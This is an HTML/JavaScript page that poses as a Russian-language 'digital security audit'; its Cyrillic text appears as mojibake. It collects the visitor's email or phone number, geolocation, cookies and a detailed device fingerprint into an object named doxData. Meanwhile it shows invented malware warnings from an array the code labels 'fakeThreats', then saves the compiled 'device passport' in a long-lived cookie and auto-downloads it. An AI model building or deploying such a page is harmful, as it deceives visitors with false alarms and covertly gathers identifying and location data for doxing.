<!DOCTYPE html>
<html>
<head>
    <title>–°–∏—Å—Ç–µ–º–Ω—ã–π –∞—É–¥–∏—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            overflow: hidden;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
            text-align: center;
            width: 350px;
        }
        h2 {
            margin-bottom: 25px;
            text-shadow: 0 0 10px #00ffea;
        }
        .input-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
        }
        button {
            background: #00dbde;
            background: linear-gradient(to right, #00dbde, #fc00ff);
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            font-size: 16px;
        }
        button:hover {
            box-shadow: 0 0 15px #fc00ff;
        }
        .hidden {
            display: none;
        }
        .scanning {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .progress-bar {
            width: 100%;
            height: 10px;
            background: #444;
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background: linear-gradient(to right, #00dbde, #fc00ff);
            width: 0%;
            transition: width 1s;
        }
        .result-item {
            text-align: left;
            width: 100%;
            margin: 8px 0;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 5px;
            font-size: 14px;
        }
        .critical {
            color: #ff5555;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div id="loginSection">
            <h2>üîç –ê—É–¥–∏—Ç —Ü–∏—Ñ—Ä–æ–≤–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h2>
            <div class="input-group">
                <input type="text" id="identifier" placeholder="Email –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω" autocomplete="off" required>
            </div>
            <button id="scanButton">–ó–ê–ü–£–°–¢–ò–¢–¨ –î–ò–ê–ì–ù–û–°–¢–ò–ö–£</button>
        </div>

        <div id="scanSection" class="hidden scanning">
            <h3>üõ°Ô∏è –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã</h3>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
            <div id="scanResults"></div>
        </div>
    </div>

    <script>
        // –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è —Å–±–æ—Ä–∞
        const doxData = {
            identifier: "",
            browser: navigator.userAgent,
            os: navigator.platform,
            screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
            hardware: "",
            cookies: "",
            location: {},
            battery: {},
            connection: {},
            storage: {},
            audioContext: "",
            gpu: "",
            fonts: []
        };

        // –ó–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.onload = function() {
            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    doxData.location = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                });
            }
            
            // –°–±–æ—Ä –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            collectAdvancedData();
            
            // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–±—ã—Ç–∏—è –¥–ª—è –∫–Ω–æ–ø–∫–∏
            document.getElementById('scanButton').addEventListener('click', startScan);
        };

        // –§–µ–π–∫–æ–≤—ã–µ —É–≥—Ä–æ–∑—ã
        const fakeThreats = [
            "–û–±–Ω–∞—Ä—É–∂–µ–Ω –∫–µ–π–ª–æ–≥–≥–µ—Ä –≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö",
            "3 —Ç—Ä–æ—è–Ω–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ",
            "–í–∞—à DNS –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ã –≤ –ö–ù–î–†",
            "–®–∏—Ñ—Ä–æ–≤–∞–ª—å—â–∏–∫ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–∞—Ö"
        ];

        function startScan() {
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä
            doxData.identifier = document.getElementById('identifier').value;
            
            document.getElementById('loginSection').classList.add('hidden');
            document.getElementById('scanSection').classList.remove('hidden');
            
            // –ò–º–∏—Ç–∞—Ü–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
            simulateScan();
        }

        function collectAdvancedData() {
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞—Ç–∞—Ä–µ–µ
            if(navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    doxData.battery = {
                        level: battery.level * 100 + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                });
            }
            
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
            if(navigator.connection) {
                doxData.connection = {
                    type: navigator.connection.type,
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms'
                };
            }
            
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ
            if(navigator.storage && navigator.storage.estimate) {
                navigator.storage.estimate().then(estimate => {
                    doxData.storage = {
                        usage: (estimate.usage / 1000000).toFixed(2) + ' MB',
                        quota: (estimate.quota / 1000000).toFixed(2) + ' MB'
                    };
                });
            }
            
            // –ê–Ω–∞–ª–∏–∑ WebGL –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è GPU
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if(gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if(debugInfo) {
                        doxData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}
            
            // –ê–Ω–∞–ª–∏–∑ —à—Ä–∏—Ñ—Ç–æ–≤
            const fontCheck = [
                'Arial', 'Verdana', 'Helvetica',
                'Comic Sans MS', 'Impact', 'Webdings',
                'Times New Roman', 'Courier New', 'Georgia'
            ];
            
            doxData.fonts = fontCheck.filter(font => {
                return document.fonts.check(`12px "${font}"`);
            });
            
            // –ê–Ω–∞–ª–∏–∑ AudioContext (–∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è —Å—Ç—Ä–æ–∫–∞)
            try {
                const AudioContextClass = window.AudioContext || window.webkitAudioContext;
                if (AudioContextClass) {
                    const audioContext = new AudioContextClass();
                    const oscillator = audioContext.createOscillator();
                    doxData.audioContext = oscillator.frequency.value + ' Hz';
                    oscillator.disconnect();
                    audioContext.close();
                } else {
                    doxData.audioContext = "–Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
                }
            } catch(e) {
                doxData.audioContext = "–æ—à–∏–±–∫–∞: " + e.message;
            }
        }

        function simulateScan() {
            const progress = document.getElementById('progress');
            const results = document.getElementById('scanResults');
            let width = 0;
            
            const scanInterval = setInterval(() => {
                width += 5;
                progress.style.width = `${width}%`;
                
                // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è "–Ω–∞—Ö–æ–¥–æ–∫"
                if(width % 20 === 0) {
                    const threat = fakeThreats[Math.floor(Math.random() * fakeThreats.length)];
                    results.innerHTML += `<div class="result-item critical">‚ö†Ô∏è ${threat}</div>`;
                }
                
                // –†–µ–∞–ª—å–Ω—ã–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –Ω–∞ 50% –∏ 90%
                if(width === 50) {
                    doxData.cookies = document.cookie;
                    doxData.hardware = getHardwareInfo();
                }
                
                // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
                if(width >= 100) {
                    clearInterval(scanInterval);
                    setTimeout(() => {
                        generateReport();
                    }, 1500);
                }
            }, 200);
        }

        function getHardwareInfo() {
            let info = "";
            if(navigator.deviceMemory) info += `RAM: ${navigator.deviceMemory}GB | `;
            if(navigator.hardwareConcurrency) info += `CPU cores: ${navigator.hardwareConcurrency} | `;
            if(navigator.maxTouchPoints) info += `Touch points: ${navigator.maxTouchPoints} | `;
            info += `Device: ${navigator.userAgentData ? navigator.userAgentData.platform : 'unknown'}`;
            return info;
        }

        function generateReport() {
            const results = document.getElementById('scanResults');
            
            // –°–±–æ—Ä –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
            const fullReport = `
========== –¶–ò–§–†–û–í–û–ô –ü–ê–°–ü–û–†–¢ –£–°–¢–†–û–ô–°–¢–í–ê ==========
üîç –°—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω: ${new Date().toLocaleString()}
üë§ –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä: ${doxData.identifier}

==== –°–ò–°–¢–ï–ú–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø ====
üñ• –ë—Ä–∞—É–∑–µ—Ä: ${doxData.browser}
üíª –û–°: ${doxData.os}
üñº –≠–∫—Ä–∞–Ω: ${doxData.screen}
‚è∞ –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${doxData.timezone}
üåê –Ø–∑—ã–∫: ${doxData.language}
üß© –ü–ª–∞–≥–∏–Ω—ã: ${doxData.plugins || '–Ω–µ—Ç'}

==== –ê–ü–ü–ê–†–ê–¢–ù–ê–Ø –ß–ê–°–¢–¨ ====
‚öôÔ∏è –ñ–µ–ª–µ–∑–æ: ${doxData.hardware}
üéÆ GPU: ${doxData.gpu || '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω'}
üîã –ë–∞—Ç–∞—Ä–µ—è: 
   –£—Ä–æ–≤–µ–Ω—å: ${doxData.battery.level || 'N/A'}
   –ó–∞—Ä—è–¥–∫–∞: ${doxData.battery.charging ? '–î–∞' : '–ù–µ—Ç'}
üì∂ –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ: 
   –¢–∏–ø: ${doxData.connection.type || 'N/A'}
   –°–∫–æ—Ä–æ—Å—Ç—å: ${doxData.connection.downlink || 'N/A'}
   –ü–∏–Ω–≥: ${doxData.connection.rtt || 'N/A'}
üíæ –•—Ä–∞–Ω–∏–ª–∏—â–µ: 
   –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: ${doxData.storage.usage || 'N/A'}
   –î–æ—Å—Ç—É–ø–Ω–æ: ${doxData.storage.quota || 'N/A'}
üéß AudioContext: ${doxData.audioContext}
üî° –®—Ä–∏—Ñ—Ç—ã: ${doxData.fonts.join(', ') || '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ'}

==== –ì–ï–û–î–ê–ù–ù–´–ï ====
üìç –®–∏—Ä–æ—Ç–∞: ${doxData.location.lat || '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ'}
üìç –î–æ–ª–≥–æ—Ç–∞: ${doxData.location.lon || '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ'}
üéØ –¢–æ—á–Ω–æ—Å—Ç—å: ${doxData.location.accuracy ? `${doxData.location.accuracy} –º–µ—Ç—Ä–æ–≤` : 'N/A'}

==== –ö–£–ö–ò –ò –°–ï–°–°–ò–ò ====
üç™ ${doxData.cookies || '–ø—É—Å—Ç–æ'}
`;

            // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ –∫—É–∫–∏
            const encodedReport = btoa(unescape(encodeURIComponent(fullReport)));
            document.cookie = `devicePassport=${encodedReport}; max-age=31536000; path=/`;
            
            // –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞
            const blob = new Blob([fullReport], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `device_passport_${doxData.identifier.replace(/[^a-z0-9]/gi, '_')}.txt`;
            document.body.appendChild(a);
            a.click();
            
            // –§–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            results.innerHTML += `<div class="result-item">‚úÖ –¶–∏—Ñ—Ä–æ–≤–æ–π –ø–∞—Å–ø–æ—Ä—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω</div>`;
            results.innerHTML += `<div class="result-item">üîê –†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –æ–±–Ω–æ–≤–∏—Ç—å –∞–Ω—Ç–∏–≤–∏—Ä—É—Å –∏ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–µ—Ç—å</div>`;
        }
    </script>
</body>
</html>
